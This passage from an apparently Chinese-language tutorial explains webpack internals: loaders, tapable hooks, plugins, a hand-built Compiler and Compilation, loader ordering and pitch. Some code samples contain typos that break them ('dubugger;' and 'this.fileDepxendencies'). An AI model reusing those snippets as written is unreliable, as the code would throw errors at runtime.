\u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;node\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;debug webpack\u0026#34;, \u0026#34;skipFiles\u0026#34;: [\u0026#34;\u0026lt;node_internals\u0026gt;/**\u0026#34;], // 跳过node核心模块代码 \u0026#34;cwd\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34;, \u0026#34;program\u0026#34;: \u0026#34;${workspaceFolder}/node_modules/webpack-cli/bin/cli.js\u0026#34; } ] } 在 webpack-cli 包中的 cli.js 文件中添加断点后便可以开始调试。\n方式三：\nvscode 中启动该文件进行调试 debugger.js:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 const webpack = require(\u0026#34;webpack\u0026#34;); const webpackConfig = require(\u0026#34;./webpack.config\u0026#34;); dubugger; const compiler = webpack(webpackConfig); //4.执行Compiler对象的 run 方法开始执行编译 compiler.run((err, stats) =\u0026gt; { if (err) { console.log(err); } else { //stats代表统计结果对象 console.log( stats.toJson({ assets: true, // 其实它是一个代码块（chunk）到文件的对应关系 chunks: true, // 从入口模块出发，找到此入口模块依赖的模块，或者依赖的模块依赖的模块，合在一起组成一个代码块，懒加载模块及其依赖也是一个chunk modules: true, // 打包的模块，项目源码仓库中的每个文件都是一个模块（js文件，jsx文件，图片，html，css等） }) ); } }); 打包后生产文件需要注意的地方\nindex.js 源文件：\n1 2 3 const title = require(\u0026#34;./title.js\u0026#34;); console.log(\u0026#34;entry1\u0026#34;, title); title.js 源文件：\n1 2 3 4 5 const msg = require(\u0026#34;./msg.js\u0026#34;); console.log(msg, \u0026#34;msg\u0026#34;); module.exports = \u0026#34;title\u0026#34;; msg.js 源文件：\n1 module.exports = \u0026#34;msg\u0026#34;; index.js 是项目的入口文件。\n打包后生成的结果：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 var modules = { \u0026#34;./src/msg.js\u0026#34;: (module) =\u0026gt; { module.exports = \u0026#34;msg\u0026#34;; }, \u0026#34;./src/title.js\u0026#34;: (module) =\u0026gt; { let msg = require(\u0026#34;./src/msg.js\u0026#34;); // 源码中是./msg.js module.exports = \u0026#34;title\u0026#34; + msg; }, }; var cache = {}; function require(moduleId) { var cachedModule = cache[moduleId]; if (cachedModule !== undefined) { return cachedModule.exports; } var module = (cache[moduleId] = { exports: {}, }); modules[moduleId](module, module.exports, require); return module.exports; } var exports = {}; let title = require(\u0026#34;./src/title.js\u0026#34;); // 源码中是./title.js console.log(\u0026#34;entry1\u0026#34;, title); 从中可以看到，在源文件的源码中，引入其他模块文件时，使用的都是从该模块文件出发到目标文件的相对路径，但是打包后生成的文件中，所有源码中的模块导入语句中的路径都变成了以项目根目录为统一出发点的相对路径。\nloader webpack 的 loder 的本质就是一个 JavaScript 函数，用于转换或者翻译 webpack 不能识别的模块转为 js 或者 json 模块。\nwebpack.config.js:\n1 2 3 4 5 6 7 8 9 10 11 12 13 module.exports = { module: { rules: [ { test: /\\.xxx$/, use: [ path.resolve(__dirname, \u0026#34;loaders/loader1.js\u0026#34;), path.resolve(__dirname, \u0026#34;loaders/loader2.js\u0026#34;), ], }, ], }, }; loaders/loader1.js:\n1 2 3 4 5 function loader1(source) { return source + \u0026#34;------\u0026#34;; } module.exports = loader1; loaders/loader2.js:\n1 2 3 4 5 6 function loader2(source) { // return source+\u0026#39;++++\u0026#39; return `module.exports = ${source}+++++++`; } module.exports = loader2; tapable tapable 是一个类似于 Node.js 中的 EventEmitter 的库，但更专注于自定义事件的触发和处理 webpack 通过 tapable 将 实现 与 流程 解耦，所有具体实现通过插件的形式存在 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 class SyncHook { constructor(args) { this.args = args; this.argsLength = args ? args.length : 0; this.taps = []; } tap(name, fn) { this.taps.push(fn); } call() { let args = Array.prototype.slice.call(arguments, 0, this.argsLength); this.taps.forEach((tap) =\u0026gt; tap(...args)); } } let hook = new SyncHook(); hook.tap(\u0026#34;some name\u0026#34;, () =\u0026gt; { console.log(\u0026#34;some name\u0026#34;); }); class Plugin { apply() { hook.tap(\u0026#34;Plugin\u0026#34;, () =\u0026gt; { console.log(\u0026#34;Plugin \u0026#34;); }); } } new Plugin().apply(); // 插件注册自己的逻辑 hook.call(); // 编译打包过程中调用自己已经注册的逻辑 plugin 在 webpack 中，有非常多类似 SyncHook 这种构造函数的实例属性值，写插件就是在这些实例属性值的订阅数组中添加一系列的方法。然后在 webpack 开始打包编译之后在各个阶段调用这些实例属性值中订阅好的方法，并执行逻辑。\nwebpack 插件的格式是固定的，插件是一个类，需要实例化，实例化后的值有一个原型方法 apply。\n插件之间的书写顺序并不会影响各个插件的执行顺序，但是如果两个插件监听的是一个 hook，那么书写顺序就和执行顺序有关了。\n插件的挂载或者说监听是在 webpack 启动编译前全部挂载的。具体由哪些 hook 实例属性值，可以在官网中查看。\nplugins/run1-plugin.js\n1 2 3 4 5 6 7 8 9 10 class RunPlugin { apply(compiler) { // 在此插件里可以监听run这个钩子 // compiler上面就有许多的hook类的实例，比如run compiler.hooks.run.tap(\u0026#34;RunPlugin\u0026#34;, () =\u0026gt; { console.log(\u0026#34;run1:开始编译\u0026#34;); }); } } module.exports = RunPlugin; plugins/run2-plugin.js\n1 2 3 4 5 6 7 8 class RunPlugin { apply(compiler) { compiler.hooks.run.tap(\u0026#34;RunPlugin\u0026#34;, () =\u0026gt; { console.log(\u0026#34;run2:开始编译\u0026#34;); }); } } module.exports = RunPlugin; plugins/done-plugin.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 class DonePlugin { apply(compiler) { compiler.hooks.done.tap(\u0026#34;DonePlugin\u0026#34;, () =\u0026gt; { console.log(\u0026#34;done:结束编译\u0026#34;); }); } } module.exports = DonePlugin; /* let compiler = { hooks: { run:new Hook(), done:new Hook() } } */ webpack.config.js\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 const path = require(\u0026#34;path\u0026#34;); const Run1Plugin = require(\u0026#34;./plugins/run1-plugin\u0026#34;); const Run2Plugin = require(\u0026#34;./plugins/run2-plugin\u0026#34;); const DonePlugin = require(\u0026#34;./plugins/done-plugin\u0026#34;); module.exports = { mode: \u0026#34;development\u0026#34;, devtool: false, plugins: [ //插件的挂载或者说监听是在编译启动前全部挂载的 new Run1Plugin(), new Run2Plugin(), new DonePlugin(), ], }; babel 和 webpack 的关系是什么？ 执行顺序是？ webpack 在编译的时候，如果遇到 js 文件，会调用 babel-loader 进行文件内容的转换，在转换的时候会使用 babel 插件来转换。\n当多个 loader 匹配到同一个文件时，Webpack 将按照配置中 loader 规则的顺序依次应用这些 loader。\n在下配置片段中，有两个 loader 都匹配到了 .txt 文件，它们的顺序如下：\n1 2 3 4 5 6 7 8 9 10 11 12 module: { rules: [ { test: /\\.txt$/, use: [loader1], // 在没有主动配置enforce字段的情况下 }, { test: /\\.txt$/, use: [loader2], }, ]; } 根据这个配置，Webpack 将首先应用 loader1，然后再应用 loader2。\n换句话说，先使用 loader1 处理 .txt 文件，然后将处理结果传递给 loader2。这样可以形成一个 loader 链，每个 loader 都可以对文件进行一些特定的处理。\n请注意，loader 的处理顺序可能会对最终的处理结果产生影响，因此在配置 loader 的顺序时，需要根据实际需求和 loader 的功能来确定顺序。\n如果希望 loader2 先处理 .txt 文件，然后再由 loader1 处理处理结果，只需调整配置中两个 loader 的顺序即可：\n1 2 3 4 5 6 7 8 9 10 11 12 module: { rules: [ { test: /\\.txt$/, use: [loader2], // 在没有主动配置enforce字段的情况下 }, { test: /\\.txt$/, use: [loader1], }, ]; } 这样，Webpack 将首先应用 loader2，然后再应用 loader1。\nwebpack 编译流程 配置文件参考：\nwebpack.config.js:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 const path = require(\u0026#34;path\u0026#34;); const Run1Plugin = require(\u0026#34;./plugins/run1-plugin\u0026#34;); const Run2Plugin = require(\u0026#34;./plugins/run2-plugin\u0026#34;); const DonePlugin = require(\u0026#34;./plugins/done-plugin\u0026#34;); module.exports = { mode: \u0026#34;development\u0026#34;, devtool: false, cache: { type: \u0026#34;filesystem\u0026#34;, }, entry: { entry1: \u0026#34;./src/entry1.js\u0026#34;, entry2: \u0026#34;./src/entry2.js\u0026#34;, // name就是此模块属于哪个模块 }, output: { path: path.resolve(__dirname, \u0026#34;dist\u0026#34;), filename: \u0026#34;[name].js\u0026#34;, }, resolve: { extensions: [\u0026#34;.js\u0026#34;, \u0026#34;.jsx\u0026#34;, \u0026#34;.ts\u0026#34;, \u0026#34;.tsx\u0026#34;], }, module: { rules: [ { test: /\\.js$/, use: [ //最左则的loader需要返回合法的JS path.resolve(__dirname, \u0026#34;loaders/loader2.js\u0026#34;), //最右侧的loader拿到的是源代码 path.resolve(__dirname, \u0026#34;loaders/loader1.js\u0026#34;), ], }, ], }, plugins: [ //插件的挂载或者说监听是在编译启动前全部挂载的 new Run1Plugin(), new Run2Plugin(), new DonePlugin(), ], }; 初始化参数：从配置文件和 Shell 语句中读取并合并参数,得出最终的配置对象\n用上一步得到的配置对象初始化 Compiler 对象\n加载(挂载)所有配置的插件，插件是在编译开始之前全部挂载（订阅）好的，等到后面编译过程中触发插件的中各种订阅函数\n执行 Compiler 对象的 run 方法开始执行编译，内部会创建新建一个 Compilation 实例对象，然后调用该实例对象的 build 方法开始打包构建\nbuild 方法中，根据配置中的entry找出入口文件\n从入口文件出发,调用所有配置的Loader对模块进行编译，得到各个 loader 处理后的文件代码，然后通过 bable 去生成并解析该文件（AST）中的代码，目的是收集到该文件依赖的其他依赖文件模块，共给下一步使用\n在结束本模块的 ast 语法树分析后，将收集到的本模块依赖的其他模块递归本步骤直到所有入口依赖的文件都经过了本步骤的处理\n根据入口和模块之间的依赖关系，组装成一个个包含多个模块的 Chunk\n再把每个 Chunk 转换成一个单独的文件加入到输出列表\n在确定好输出内容后，根据配置确定输出的路径和文件名，把文件内容写入到文件系统\n在以上过程中，Webpack 会在特定的时间点广播出特定的事件，插件在监听到对应的事件后会执行特定的逻辑，并且插件可以调用 Webpack 提供的 API 改变 Webpack 的运行结果。 dubugger.js: ```js const webpack = require(\u0026quot;./webpack\u0026quot;); const webpackConfig = require(\u0026quot;./webpack.config\u0026quot;); dubugger; const compiler = webpack(webpackConfig); //4.执行`Compiler`对象的 run 方法开始执行编译 compiler.run((err, stats) =\u0026gt; { if (err) { console.log(err); } else { //stats代表统计结果对象 console.log( stats.toJson({ files: true, //代表打包后生成的文件 assets: true, //其它是一个代码块到文件的对应关系 chunks: true, //从入口模块出发，找到此入口模块依赖的模块，或者依赖的模块依赖的模块，合在一起组成一个代码块 modules: true, //打包的模块 }) ); } }); ``` webpack.js: ```js const Compiler = require(\u0026quot;./Compiler\u0026quot;); function webpack(options) { // 1.初始化参数：从配置文件和 Shell 语句中读取并合并参数,得出最终的配置对象 //argv[0]是Node程序的绝对路径 argv[1] 正在运行的脚本 const argv = process.argv.slice(2); // 真正需要的shell参数 const shellOptions = argv.reduce((shellOptions, options) =\u0026gt; { // options = '--mode=development' const [key, value] = options.split(\u0026quot;=\u0026quot;); shellOptions[key.slice(2)] = value; return shellOptions; }, {}); const finalOptions = { ...options, ...shellOptions }; // 这里就体现的shell中设置参数的权重更高的原因 //2.用上一步得到的参数初始化 `Compiler` 对象，单例的，compiler实例对象管理着整个打包过程 const compiler = new Compiler(finalOptions); //3.加载所有配置的插件 plugins这就是插件类的实例组成的数组 const { plugins } = finalOptions; for (let plugin of plugins) { plugin.apply(compiler); } return compiler; } module.exports = webpack; ``` Compiler.js: ```js const { SyncHook } = require(\u0026quot;tapable\u0026quot;); const Compilation = require(\u0026quot;./Compilation\u0026quot;); const fs = require(\u0026quot;fs\u0026quot;); const path = require(\u0026quot;path\u0026quot;); // Compiler代表整个编译过程，在编译一启动时创建，贯穿整个编译打包的生命周期且是单例的，整个编译打包过程中就一个实例。 class Compiler { constructor(options) { this.options = options; this.hooks = { // Compiler 实例上有许多构造函数实例化后的钩子 run: new SyncHook(), // 在开始编译之前调用 done: new SyncHook(), // 在编译完成时执行 }; } run(callback) { this.hooks.run.call(); // 在编译开始前触发run钩子执行 // 在编译的过程中会收集所有依赖的模块或者说文件 // stats指的是统计信息 modules chunks files=bundle assets指的是文件名和文件内容的映射关系 const onCompiled = (err, stats, fileDependencies) =\u0026gt; { console.log(\u0026quot;stats\u0026quot;, stats); console.log(\u0026quot;fileDependencies\u0026quot;, fileDependencies); //10.在确定好输出内容后，根据配置确定输出的路径和文件名，把文件内容写入到文件系统 for (let filename in stats.assets) { let filePath = path.join(this.options.output.path, filename); fs.writeFileSync(filePath, stats.assets[filename], \u0026quot;utf8\u0026quot;); } callback(err, { toJson: () =\u0026gt; stats }); for (let fileDependency of fileDependencies) { //监听依赖的文件变化，如果依赖的文件变化后会开始一次新的编译 fs.watch(fileDependency, () =\u0026gt; this.compile(onCompiled)); } this.hooks.done.call(); // 在编译完成时触发done钩子执行 }; // 调用compile方法进行编译 this.compile(onCompiled); } // 开启一次新的编译 compile(callback) { // 每次编译 都会创建一个新的Compilation实例 let compilation = new Compilation(this.options, this); compilation.build(callback); } } module.exports = Compiler; ``` Compilation.js: ```js const path = require(\u0026quot;path\u0026quot;); const fs = require(\u0026quot;fs\u0026quot;); const parser = require(\u0026quot;@babel/parser\u0026quot;); const types = require(\u0026quot;@babel/types\u0026quot;); const traverse = require(\u0026quot;@babel/traverse\u0026quot;).default; const generator = require(\u0026quot;@babel/generator\u0026quot;).default; const baseDir = normalizePath(process.cwd()); function normalizePath(path) { return path.replace(/\\\\/g, \u0026quot;/\u0026quot;); } class Compilation { constructor(options, compiler) { this.options = options; this.compiler = compiler; this.modules = []; // 这里放置本次编译涉及的所有的模块 this.chunks = []; // 本次编译所组装出的代码块 this.assets = {}; // key是文件名,值是文件内容 this.files = []; // 代表本次打包出来的文件 this.fileDependencies = new Set(); // 本次编译依赖的文件或者说模块 // 这个对象上也有很多的hook } build(callback) { // 5.根据配置中的entry找出入口文件 let entry = {}; if (typeof this.options.entry === \u0026quot;string\u0026quot;) { entry.main = this.options.entry; } else { entry = this.options.entry; } for (let entryName in entry) { // const baseDir = normalizePath(process.cwd()); let entryFilePath = path.posix.join(baseDir, entry[entryName]); // 将entry中的相对地址转为从磁盘根路径出发的绝对地址 this.fileDepxendencies.add(entryFilePath); // 6.从入口文件出发,调用所有配置的Loader对模块进行编译 let entryModule = this.buildModule(entryName, entryFilePath); // this.modules.push(entryModule); // 8.根据入口和模块之间的依赖关系， Chunk let chunk = { name: entryName, entryModule, modules: this.modules.filter((module) =\u0026gt; module.names.includes(entryName) ), }; this.chunks.push(chunk); } //9.再把每个 Chunk 转换成一个单独的文件加入到输出列表 this.chunks.forEach((chunk) =\u0026gt; { const filename = this.options.output.filename.replace( \u0026quot;[name]\u0026quot;, chunk.name ); this.files.push(filename); this.assets[filename] = getSource(chunk); }); callback( null, { modules: this.modules, chunks: this.chunks, assets: this.assets, files: this.files, }, this.fileDependencies ); } /** * 编译模块 * @param {*} name 模块所属的代码块(chunk)的名称，也就是entry配置项的key entry1 entry2 * @param {*} modulePath 模块的路径，绝对路径 */ buildModule(name, modulePath) { //1.读取文件的内容 let sourceCode = fs.readFileSync(modulePath, \u0026quot;utf8\u0026quot;); // 同步读取文件内容 let { rules = [] } = this.options.module; //根据规则找到所有的匹配的loader let loaders = []; rules.forEach((rule) =\u0026gt; { // 从这段代码逻辑可以看出，针对某个类型的文件会遍历webpack配置文件中的所有rule，命中其中符合test规则的文件，然后用loader进行处理，如果有多个规则都能命中同一个文件，那么都会对前面rule处理过的文件源码进行进一步处理。 if (modulePath.match(rule.test)) { loaders.push(...rule.use); } }); //调用所有配置的Loader对模块进行转换 sourceCode = loaders.reduceRight((sourceCode, loader) =\u0026gt; { return require(loader)(sourceCode); }, sourceCode); // 7.再找出该模块依赖的模块，再递归本步骤直到所有入口依赖的文件都经过了本步骤的处理 ， 找出某个模块文件中依赖的其他模块则是通过AST查找获取 // 声明当前模块的ID let moduleId = \u0026quot;./\u0026quot; + path.posix.relative(baseDir, modulePath); // relative方法返回一个相对的路径 //创建一个模块，ID就是相对于根目录的相对路径，dependencies就是此模块依赖的模块 //name是模块所属的代码块的名称, 如果一个模块属于多个代码块，那么name就是一个数组（比如一个模块被多个入口中的其他模块都引用了。） let module = { id: moduleId, dependencies: [], names: [name] }; let ast = parser.parse(sourceCode, { sourceType: \u0026quot;module\u0026quot; }); //Visitor是babel插件中的概念，此处没有 traverse(ast, { CallExpression: ({ node }) =\u0026gt; { if (node.callee.name === \u0026quot;require\u0026quot;) { let depModuleName = node.arguments[0].value; // \u0026quot;./title\u0026quot; let depModulePath; if (depModuleName.startsWith(\u0026quot;.\u0026quot;)) { //暂时先不考虑node_modules里的模块，先只考虑相对路径 const currentDir = path.posix.dirname(modulePath); //要找当前模块所有在的目录下面的相对路径 depModulePath = path.posix.join(currentDir, depModuleName); //此绝对路径可能没有后续，需要尝试添加后缀 const extensions = this.options.resolve.extensions; depModulePath = tryExtensions(depModulePath, extensions); } else { //如果不是以.开头的话，就是第三方模块 depModulePath = require.resolve(depModuleName); } this.fileDependencies.add(depModulePath); //获取依赖的模块的ID,修改语法树，把依赖的模块名换成模块ID let depModuleId = \u0026quot;./\u0026quot; + path.posix.relative(baseDir, depModulePath); node.arguments[0] = types.stringLiteral(depModuleId); //把依赖的模块ID和依赖的模块路径放置到当前模块的依赖数组中 module.dependencies.push({ depModuleId, depModulePath, }); } }, }); //使用改造后的ast语法要地重新生成新的源代码 let { code } = generator(ast); module._source = code; // 递归当前模块依赖的其他模块 module.dependencies.forEach(({ depModuleId, depModulePath }) =\u0026gt; { //判断此依赖的模块是否已经打包过了或者说编译过了 let existModule = this.modules.find( (module) =\u0026gt; module.id === depModuleId ); if (existModule) { existModule.names.push(name); } else { let depModule = this.buildModule(name, depModulePath); // 这里的name使用的是第一次传入的那个值，如entry1和entry2 this.modules.push(depModule); } }); return module; } } function tryExtensions(modulePath, extensions) { if (fs.existsSync(modulePath)) { return modulePath; } for (let i = 0; i \u0026lt; extensions.length; i++) { let filePath = modulePath + extensions[i]; if (fs.existsSync(filePath)) { return filePath; } } throw new Error(`找不到${modulePath}`); } function getSource(chunk) { return ` (() =\u0026gt; { var modules = { ${chunk.modules .map( (module) =\u0026gt; ` \u0026quot;${module.id}\u0026quot;: (module, exports, require) =\u0026gt; { ${module.\\_source} } ` ) .join(\u0026quot;,\u0026quot;)} }; var cache = {}; function require(moduleId) { var cachedModule = cache[moduleId]; if (cachedModule !== undefined) { return cachedModule.exports; } var module = cache[moduleId] = { exports: {} }; modules[moduleId](module, module.exports, require); return module.exports; } var exports = {}; (() =\u0026gt; { ${chunk.entryModule._source} })(); })(); `; } module.exports = Compilation;\n``` ``` compiler 和 compilation 概念辨析：\ncompiler实例对象上挂载着 webpack 环境所有的配置信息，包括 loader，plugins，entry 等等，compiler实例对象是在启动 webpack 的时候实例化好的，它是全局唯一的，可以理解为 webpack 实例\nCompiler 模块是 webpack 的主要引擎，它通过 CLI 或者 Node API 传递的所有选项创建出一个 Compiler 实例。 它扩展（extends）自 Tapable 类，用来注册和调用插件。 大多数面向用户的插件会首先在 Compiler 上注册。\ncompilation 对象代表了一次资源版本的构建。它包含了当前的模块资源(modules)、编译生成资源(asset)、变化的文件(files)、以及被跟踪依赖的状态信息(fileDependencies)等。当 webpack 以开发模式运行时，每当检测到一个依赖文件发生变化变化，一次新的 compilation 将被创建。compilation 对象也提供了很多事件回调供插件做扩展。通过 compilation 也可以读取到 compiler 对象。\nCompilation 模块会被 Compiler 用来创建新的 compilation 对象（或新的 build 对象）。 compilation 实例能够访问所有的模块和它们的依赖（大部分是循环依赖）。 它会对应用程序的依赖图中所有模块， 进行字面上的编译(literal compilation)。 在编译阶段，模块会被加载(load)、封存(seal)、优化(optimize)、 分块(chunk)、哈希(hash)和重新创建(restore)。\nCompilation 类扩展(extend)自 Tapable，并提供了以下生命周期钩子。 可以按照 compiler 钩子的相同方式来调用 tap。\n扩展：\ntapable 是 webpack 的一个核心工具，它暴露了 tap、tapAsync、tapPromise 方法，可以使用这些方法来触发 compiler 钩子，使得插件可以监听 webpack 在运行过程中广播的事件，然后通过 compiler 对象去操作 webpack。也可以使用这些方法注入自定义的构建步骤，这些步骤将在整个编译过程中的不同时机触发。\ndeps 的变化会导致整个依赖链路上的内容都重新编译还是只编译变化部分？\n如果有文件变化的话，在 webpack5 以前会全部会重新编译，比较慢，所以在 webpack5 以前可以使用：cache hardsource dllplugin 等方法提升打包构建速度，但是 webpack5 以后，内置这些缓存机制。\nloader loader 是一个模块文件导出的函数。它接收上一个 loader 产生的结果或者资源文件(resource file)作为入参。也可以用多个 loader 函数组成 loader chain compiler 需要得到最后一个 loader 产生的处理结果。这个处理结果应该是 String 或者 Buffer（被转换为一个 string） loader 执行时机 loader 分类 loader 有四种执行时机分类，它们的组合是有顺序的。\npost(后置) inline(内联)，只针对指定的设置了内联 loader 的模块文件起作用 normal(正常) pre(前置) 一个 loader 在被具体配置到 webpack 之前，是没办法区分它是在具体的哪个时机被调用的。\n因为 loader 配置可以是由多个配置文件合并而来，为了保证执行的时候按我们希望的顺序执行，所以可以给 loader 区分调用时机。\n如何表示某个 loader 被放置在这四种执行时机中的哪一种？\n通过每个 rule 规则中，设置 enforce 配置项的值来解决，enforce:'pre'|'post'|'normal',不写默认 normal 或者通过 loader 的内联写法实现，inline-loader1!inline-loader2!${entryFile} loader 的工作 loader 的调用是依赖loader-runner这个库进行的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 const { runLoaders } = require(\u0026#34;loader-runner\u0026#34;); const path = require(\u0026#34;path\u0026#34;); const fs = require(\u0026#34;fs\u0026#34;); // webpack-dev-server启开发服务器的时候 memory-fs const entryFile = path.resolve(__dirname, \u0026#34;src/index.js\u0026#34;); //如何配置行内 let request = `inline-loader1!inline-loader2!${entryFile}`; let rules = [ { test: /\\.js$/, use: [\u0026#34;normal-loader1\u0026#34;, \u0026#34;normal-loader2\u0026#34;], }, { test: /\\.js$/, enforce: \u0026#34;post\u0026#34;, use: [\u0026#34;post-loader1\u0026#34;, \u0026#34;post-loader2\u0026#34;], }, { test: /\\.js$/, enforce: \u0026#34;pre\u0026#34;, use: [\u0026#34;pre-loader1\u0026#34;, \u0026#34;pre-loader2\u0026#34;], }, ]; let parts = request.split(\u0026#34;!\u0026#34;); // [inline-loader1,inline-loader2, xxx/xxx/xx/src/index.js] let resource = parts.pop(); // 弹出最后一个元素 entryFile=src/index.js let inlineLoaders = parts; // [inline-loader1,inline-loader2] let preLoaders = [], postLoaders = [], normalLoaders = []; for (let i = 0; i \u0026lt; rules.length; i++) { let rule = rules[i]; if (rule.test.test(resource)) { if (rule.enforce === \u0026#34;pre\u0026#34;) { preLoaders.push(...rule.use); } else if (rule.enforce === \u0026#34;post\u0026#34;) { postLoaders.push(...rule.use); } else { normalLoaders.push(...rule.use); } } } let loaders = [ ...postLoaders, ...inlineLoaders, ...normalLoaders, ...preLoaders, ]; let resolveLoader = (loader) =\u0026gt; path.resolve(__dirname, \u0026#34;loaders-chain\u0026#34;, loader); // loaders-chain是自己创建的文件夹，里面是自己写的loader //把loader数组从名称变成绝对路径 loaders = loaders.map(resolveLoader); runLoaders( { resource, //你要加载的资源 loaders, context: { name: \u0026#34;zhufeng\u0026#34;, age: 100 }, //保存一些状态和值 readResource: fs.readFile.bind(this), }, (err, result) =\u0026gt; { console.log(err); //运行错误 console.log(result); //运行的结果 console.log( result.resourceBuffer ? result.resourceBuffer.toString(\u0026#34;utf8\u0026#34;) : null ); //读到的原始的文件 } ); 内联 loader 的特殊配置 loaders/#configuration 符号 变量 含义 -! noPreAutoLoaders 不要前置和普通 loader Prefixing with -! will disable all configured preLoaders and loaders but not postLoaders ! noAutoLoaders 不要普通 loader Prefixing with ! will disable all configured normal loaders !! noPrePostAutoLoaders 不要前后置和普通 loader,只要内联 loader Prefixing with !! will disable all configured loaders (preLoaders, loaders, postLoaders) 1 2 3 4 5 6 7 8 // loader分类跟loader自己没有关系，跟使用时候的配置有关系 // eslint-loader中配置的pre babel-loader=normal /** * Auto=Normal * ! noAuto * -! noPreAuto * !! noPrePostAuto */ 1 2 3 4 5 let request = `!inline-loader1!inline-loader2!${entryFile}`; let request = `-!inline-loader1!inline-loader2!${entryFile}`; let request = `!!inline-loader1!inline-loader2!${entryFile}`; 源码实现：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 const { runLoaders } = require(\u0026#34;./loader-runner\u0026#34;); const path = require(\u0026#34;path\u0026#34;); const fs = require(\u0026#34;fs\u0026#34;);//webpack-dev-server启开发服务器的时候 memory-fs const entryFile = path.resolve(__dirname, \u0026#34;src/index.js\u0026#34;); //如何配置行内 let request = `inline-loader1!inline-loader2!${entryFile}`; let rules = [ { test: /\\.js$/, use: [\u0026#34;normal-loader1\u0026#34;, \u0026#34;normal-loader2\u0026#34;], }, { test: /\\.js$/, enforce: \u0026#34;post\u0026#34;, use: [\u0026#34;post-loader1\u0026#34;, \u0026#34;post-loader2\u0026#34;], }, { test: /\\.js$/, enforce: \u0026#34;pre\u0026#34;, use: [\u0026#34;pre-loader1\u0026#34;, \u0026#34;pre-loader2\u0026#34;], }, ]; + let parts = request.replace(/^-?!+/,\u0026#39;\u0026#39;).split(\u0026#39;!\u0026#39;); let resource = parts.pop();//弹出最后一个元素 entryFile=src/index.js let inlineLoaders = parts;//[inline-loader1,inline-loader2] let preLoaders = [],postLoaders=[],normalLoaders=[]; for(let i=0;i\u0026lt;rules.length;i++){ let rule = rules[i]; if(rule.test.test(resource)){ if(rule.enforce===\u0026#39;pre\u0026#39;){ preLoaders.push(...rule.use); }else if(rule.enforce===\u0026#39;post\u0026#39;){ postLoaders.push(...rule.use); }else{ normalLoaders.push(...rule.use); } } } + let loaders = []; + if(request.startsWith(\u0026#39;!!\u0026#39;)){ + loaders = [...inlineLoaders]; + //noPreAutoLoaders + }else if(request.startsWith(\u0026#39;-!\u0026#39;)){ + loaders = [...postLoaders,...inlineLoaders]; + }else if(request.startsWith(\u0026#39;!\u0026#39;)){ + //noAutoLoaders + loaders = [...postLoaders,...inlineLoaders,...preLoaders]; + }else{ + loaders = [...postLoaders,...inlineLoaders,...normalLoaders,...preLoaders]; + } let resolveLoader = loader=\u0026gt;path.resolve(__dirname,\u0026#39;loaders-chain\u0026#39;,loader) //把loader数组从名称变成绝对路径 loaders= loaders.map(resolveLoader); runLoaders({ resource,//你要加载的资源 loaders, context:{name:\u0026#39;zhufeng\u0026#39;,age:100},//保存一些状态和值 readResource:fs.readFile.bind(this) },(err,result)=\u0026gt;{ console.log(err);//运行错误 console.log(result);//运行的结果 console.log(result.resourceBuffer?result.resourceBuffer.toString(\u0026#39;utf8\u0026#39;):null);//读到的原始的文件 }); pitch 比如 a!b!c!module, 正常调用顺序应该是 c、b、a，但是真正调用顺序是 a(pitch)、b(pitch)、c(pitch)、c、b、a，如果其中任何一个 pitching loader 返回了非空值就相当于在它以及它右边的 loader 已经执行完毕\n比如，如果 b 的 pitch 返回了字符串\u0026quot;result b\u0026quot;, 接下来只有 a 会被系统执行，且 a 的 loader 收到的参数是 result b，并且源文件也没有被读取过\nloader 根据返回值可以分为两种，一种是返回 js 代码（一个 module 的代码，含有类似 module.export 语句）的 loader，还有不能作为最左边 loader 的其他 loader\n有时候想把两个第一种（都返回一个符合 commonjs 规范的 JS 代码的 loader） loader chain 起来，比如 style-loader!css-loader! 问题是 css-loader 的返回值是一串 js 代码，如果按正常方式写 style-loader 的参数就是一串代码串，为了解决这种问题，就需要在 style-loader 里执行 require(css-loader!resources)\n使用 pitch 的情况：\n实现 loader 的pitch方法可以在特定情况下提供额外的灵活性和控制，这对于优化构建过程、条件性地处理模块、或在特定的预处理步骤中非常有用。以下是一些需要实现pitch方法的场景：\n条件性跳过后续的 loader：如果你的 loader 可以根据某些条件（例如，资源的路径、查询参数、或者项目的配置）决定不需要执行后续的 loader，你可以在pitch方法中根据这些条件返回一个结果，从而跳过后续的 loader 处理。 避免不必要的处理：当确定某些资源不需要经过复杂的转换或处理时，通过pitch方法直接返回结果可以减少不必要的计算和处理时间，优化构建性能。 资源替换或代理：在某些场景下，可能需要基于开发环境和生产环境来替换资源或者提供资源的代理版本。通过pitch方法，可以根据环境或配置条件动态决定使用哪个版本的资源。 提前处理共享数据：如果你的 loader 需要在实际处理资源之前预处理一些数据，或者需要在 loader 链中的不同 loader 之间共享数据，可以使用pitch方法的data参数来实现。这样，你可以在pitch阶段计算或准备数据，并在实际的 loader 处理函数中使用这些数据。 插入额外的资源或代码片段：在处理某个资源之前，如果需要向模块注入额外的代码片段或依赖，pitch方法提供了一个机会来实现这一点。通过在pitch阶段动态修改请求或添加额外的资源，可以灵活地控制资源的处理过程。 性能优化：对于一些重的处理过程，如果可以通过简单的检查来预先判断结果，那么在pitch方法中提前返回这个结果可以避免后续不必要的处理，从而达到性能优化的目的。 